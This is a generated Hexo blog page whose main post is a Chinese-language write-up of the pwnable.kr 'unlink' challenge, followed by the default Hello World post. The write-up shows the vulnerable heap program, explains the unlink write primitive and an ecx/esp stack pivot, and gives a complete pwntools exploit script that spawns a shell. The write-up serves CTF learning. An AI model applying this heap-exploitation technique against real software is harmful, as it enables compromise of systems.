@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS-каналы"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Поиск"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-unlink" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/28/unlink/" class="article-date">
+  <time datetime="2017-09-28T08:07:43.000Z" itemprop="datePublished">2017-09-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/28/unlink/">pwnable.kr之unlink</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pwnable-kr之unlink"><a href="#pwnable-kr之unlink" class="headerlink" title="pwnable.kr之unlink"></a>pwnable.kr之unlink</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">&#125;OBJ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</div><div class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line"></div><div class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></div><div class="line">    A-&gt;fd = B;</div><div class="line">    B-&gt;bk = A;</div><div class="line">    B-&gt;fd = C;</div><div class="line">    C-&gt;bk = B;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</div><div class="line">    <span class="comment">// heap overflow!</span></div><div class="line">    gets(A-&gt;buf);</div><div class="line"></div><div class="line">    <span class="comment">// exploit this unlink!</span></div><div class="line">    unlink(B);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这道题考查基础的堆溢出unlink利用, 其中实现的unlink函数是对早期ptmalloc的模拟. 程序给了堆栈的leak和获取shell的位置, 只需修改程序控制流即可.</p>
+<p>这里定义的OBJ结构体指向chunk体部分, 不包含chunk头部分, 因此P-&gt;fd = <em>(P), P-&gt;bk = </em>(P + 4).</p>
+<p>unlink主要的漏洞点发生在</p>
+<pre><code>FD-&gt;bk=BK;
+BK-&gt;fd=FD;
+</code></pre><p>两句,</p>
+<p>FD-&gt;bk = P -&gt; fd -&gt; bk = BK = P -&gt; bk, 亦即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(*(P) + 4)=*(P+4)</div></pre></td></tr></table></figure>
+<p>我们假设内存布局为</p>
+<p>A1|A2|A3|A4|B1|B2|B3|B4</p>
+<p>则在unlink B的时候P-&gt;fd = A; P -&gt; bk = B,</p>
+<p>那么就有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*(B3 + 4) = B4;</div><div class="line">*(B4) = B3;</div></pre></td></tr></table></figure>
+<p>可以看到, 这种unlink漏洞有两次任意内存写机会, 但是这个机会不是很好用, 因为两次写是有一定关联的. 最直观的想法就是把main函数ret地址写到B4, shell地址写到B3, 但是这样一来会向代码段非法写入. 接下来的一个想法是把一段足够短的跳板或者二次跳板程序写入到A3A4…(这是我们最早可控的内存), 然后通过控制ret跳转到堆上, 遗憾的是程序开启了数据执行保护, 堆上无法执行程序.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@hyrathon-vm ➜ Desktop  checksec unlink</div><div class="line">[*] &apos;/mnt/hgfs/Desktop/unlink&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
+<p>做到这里有一点卡壳了, 很羞耻的去网上找了一下writeup, 发现汇编中有这样一段栈很有趣:</p>
+<p><img src="unlink/1.png" alt=""></p>
+<p>在退出main函数之前, 有一个mov ecx, [ebp-4]和lea esp, [ecx-4], 随后esp被恢复到eip. 既然没有办法直接控制ret, 可以通过控制ebp-4而控制ecx, 进而控制esp, eip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">eip = esp</div><div class="line">esp = ecx - 4</div><div class="line">ecx = [ebp - 4]</div></pre></td></tr></table></figure>
+<p>我们想让eip=shell地址, 那么就应该控制ecx = shell地址+4, 即[ebp - 4] = shell地址 + 4, 而ebp - 4的地址可以通过stack_leak计算得来(经过实际验证为stack_leak + 0x10). shell地址则应该写在一个我们能控制的位置(堆上A3), 那么payload在堆上的布局就应该是</p>
+<p>A1|A2|shell地址|padding|padding|padding|heap_leak + 0xc|stack_leak + 0x10</p>
+<p>heap_leak + 0xc处0xc来自于shellcode地址本身与heap_leak相隔8, 加上ecx - 4时需要减4, 因此这里再加4.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./unlink"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"here is stack address leak: "</span>)</div><div class="line">stack_address = int(p.recvline(), <span class="number">16</span>)</div><div class="line">p.recvuntil(<span class="string">"here is heap address leak: "</span>)</div><div class="line">heap_address = int(p.recvline(), <span class="number">16</span>)</div><div class="line">p.recvuntil(<span class="string">"now that you have leaks, get shell!"</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"stack_address:"</span>, hex(stack_address), <span class="string">"heap_address"</span>, hex(heap_address)</div><div class="line"></div><div class="line">payload = p32(<span class="number">0x080484EB</span>) + <span class="string">'a'</span>*<span class="number">12</span> + p32(heap_address + <span class="number">0xc</span>) + p32(stack_address + <span class="number">0x10</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/28/unlink/" data-id="cj846jigh00019g9992u5ywks" class="article-share-link">Поделиться</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/28/hello-world/" class="article-date">
+  <time datetime="2017-09-28T07:14:20.357Z" itemprop="datePublished">2017-09-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/28/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/28/hello-world/" data-id="cj846jigc00009g992fthuhir" class="article-share-link">Поделиться</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Метки</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Облако меток</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Архив</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Недавние записи</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/09/28/unlink/">pwnable.kr之unlink</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/28/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Создано с помощью <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
